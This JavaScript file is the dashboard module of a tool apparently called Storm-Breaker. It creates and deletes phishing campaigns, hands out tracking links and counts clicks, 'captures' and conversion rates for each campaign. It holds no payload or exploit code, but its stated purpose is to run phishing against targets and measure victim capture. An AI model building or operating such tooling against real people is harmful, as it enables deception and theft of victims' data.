/**
 * Storm-Breaker Campaign Manager
 * Create, track, and analyze phishing campaigns with funnel metrics
 */

const CampaignManager = {
    campaigns: [],
    templates: [],

    async init() {
        await this.loadTemplates();
        await this.loadCampaigns();
    },

    async loadTemplates() {
        try {
            const resp = await fetch('/list_templates');
            this.templates = await resp.json();
        } catch (e) { console.error('Load templates error:', e); }
    },

    async loadCampaigns() {
        try {
            const resp = await fetch('/api/campaigns/list');
            const data = await resp.json();
            this.campaigns = data.campaigns || [];
            this.renderCampaigns();
        } catch (e) { console.error('Load campaigns error:', e); }
    },

    async createCampaign() {
        const name = document.getElementById('campaignName')?.value;
        const template = document.getElementById('campaignTemplate')?.value;
        const description = document.getElementById('campaignDescription')?.value || '';
        const callbackUrl = document.getElementById('campaignCallbackUrl')?.value || '';

        if (!name) {
            GrowlNotification.notify({ title: 'Error', description: 'Campaign name is required', type: 'error', position: 'top-right', closeTimeout: 3000 });
            return;
        }

        try {
            const resp = await fetch('/api/campaigns/create', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ name, template, description, callback_url: callbackUrl })
            });
            const data = await resp.json();

            if (data.error) throw new Error(data.error);

            GrowlNotification.notify({
                title: 'Campaign Created',
                description: `Tracking link: /c/${data.link_code}`,
                type: 'success', position: 'top-right', closeTimeout: 5000
            });

            // Clear form
            if (document.getElementById('campaignName')) document.getElementById('campaignName').value = '';
            if (document.getElementById('campaignDescription')) document.getElementById('campaignDescription').value = '';

            this.loadCampaigns();
        } catch (e) {
            GrowlNotification.notify({ title: 'Error', description: e.message, type: 'error', position: 'top-right', closeTimeout: 4000 });
        }
    },

    async deleteCampaign(id) {
        if (!confirm('Delete this campaign and all its tracking links?')) return;
        try {
            await fetch(`/api/campaigns/${id}`, { method: 'DELETE' });
            this.loadCampaigns();
            GrowlNotification.notify({ title: 'Deleted', description: 'Campaign removed', type: 'info', position: 'top-right', closeTimeout: 2000 });
        } catch (e) { console.error('Delete error:', e); }
    },

    renderCampaigns() {
        const container = document.getElementById('campaignsList');
        if (!container) return;

        // Render template dropdown
        const templateSelect = document.getElementById('campaignTemplate');
        if (templateSelect && templateSelect.options.length <= 1) {
            this.templates.forEach(t => {
                const opt = document.createElement('option');
                opt.value = t;
                opt.textContent = t.replace(/_/g, ' ');
                templateSelect.appendChild(opt);
            });
        }

        if (this.campaigns.length === 0) {
            container.innerHTML = `<div class="text-center py-8 text-gray-500">
                <i class="fas fa-bullhorn text-4xl mb-3"></i>
                <p>No campaigns yet. Create your first campaign above.</p>
            </div>`;
            return;
        }

        container.innerHTML = this.campaigns.map(c => {
            const links = c.links || [];
            const totalClicks = c.total_clicks || 0;
            const totalCaptures = c.total_captures || 0;
            const convRate = totalClicks > 0 ? ((totalCaptures / totalClicks) * 100).toFixed(1) : 0;
            const statusColor = c.status === 'active' ? 'text-green-400' : 'text-gray-500';

            return `
            <div class="bg-gray-800/50 rounded-xl p-5 border border-gray-700/50 hover:border-cyan-500/30 transition-all">
                <div class="flex items-center justify-between mb-3">
                    <div>
                        <h3 class="text-lg font-bold text-white">${this.esc(c.name)}</h3>
                        <span class="text-xs text-gray-400">Template: <span class="text-cyan-400">${c.template || 'N/A'}</span></span>
                    </div>
                    <div class="flex items-center gap-3">
                        <span class="${statusColor} text-sm font-bold"><i class="fas fa-circle text-xs mr-1"></i>${c.status}</span>
                        <button onclick="CampaignManager.deleteCampaign(${c.id})" class="text-red-400 hover:text-red-300 transition-colors" title="Delete">
                            <i class="fas fa-trash"></i>
                        </button>
                    </div>
                </div>

                ${c.description ? `<p class="text-sm text-gray-400 mb-3">${this.esc(c.description)}</p>` : ''}

                <!-- Funnel Metrics -->
                <div class="grid grid-cols-3 gap-3 mb-4">
                    <div class="bg-gray-900/50 rounded-lg p-3 text-center">
                        <div class="text-2xl font-bold text-blue-400">${totalClicks}</div>
                        <div class="text-xs text-gray-400">Clicks</div>
                    </div>
                    <div class="bg-gray-900/50 rounded-lg p-3 text-center">
                        <div class="text-2xl font-bold text-green-400">${totalCaptures}</div>
                        <div class="text-xs text-gray-400">Captures</div>
                    </div>
                    <div class="bg-gray-900/50 rounded-lg p-3 text-center">
                        <div class="text-2xl font-bold text-yellow-400">${convRate}%</div>
                        <div class="text-xs text-gray-400">Conv. Rate</div>
                    </div>
                </div>

                <!-- Funnel Bar -->
                <div class="w-full bg-gray-700 rounded-full h-2 mb-3">
                    <div class="h-2 rounded-full bg-gradient-to-r from-blue-500 via-green-500 to-yellow-500" style="width: ${Math.min(convRate, 100)}%"></div>
                </div>

                <!-- Tracking Links -->
                <div class="space-y-2">
                    <div class="text-xs font-bold text-gray-400 uppercase">Tracking Links</div>
                    ${links.map(l => `
                        <div class="flex items-center justify-between bg-gray-900/50 rounded px-3 py-2 text-sm">
                            <code class="text-cyan-400">/c/${l.link_code}</code>
                            <div class="flex items-center gap-3 text-xs text-gray-400">
                                <span><i class="fas fa-mouse-pointer mr-1"></i>${l.clicks}</span>
                                <span><i class="fas fa-crosshairs mr-1"></i>${l.captures}</span>
                                <button onclick="CampaignManager.copyLink('/c/${l.link_code}')" class="text-gray-400 hover:text-white" title="Copy Link">
                                    <i class="fas fa-copy"></i>
                                </button>
                            </div>
                        </div>
                    `).join('')}
                </div>

                <div class="text-xs text-gray-500 mt-3">Created: ${c.created_at || 'N/A'}</div>
            </div>`;
        }).join('');
    },

    copyLink(path) {
        const fullUrl = window.location.origin + path;
        navigator.clipboard.writeText(fullUrl);
        GrowlNotification.notify({ title: 'Link Copied', description: fullUrl, type: 'info', position: 'top-right', closeTimeout: 2000 });
    },

    esc(text) {
        const div = document.createElement('div');
        div.textContent = text || '';
        return div.innerHTML;
    }
};
